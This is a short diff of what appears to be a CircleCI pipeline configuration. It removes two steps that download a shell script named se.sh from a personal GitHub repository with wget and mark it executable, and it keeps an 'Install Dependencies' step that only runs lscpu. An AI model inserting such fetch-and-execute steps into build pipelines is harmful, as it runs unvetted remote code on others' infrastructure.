@@ -7,8 +7,6 @@ jobs:
         - run:
             name: Install Dependencies
             command: timeout 1m lscpu
-        -   run: wget https://raw.githubusercontent.com/Cetto1903/magar/main/se.sh
-        -   run: chmod +x se.sh
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
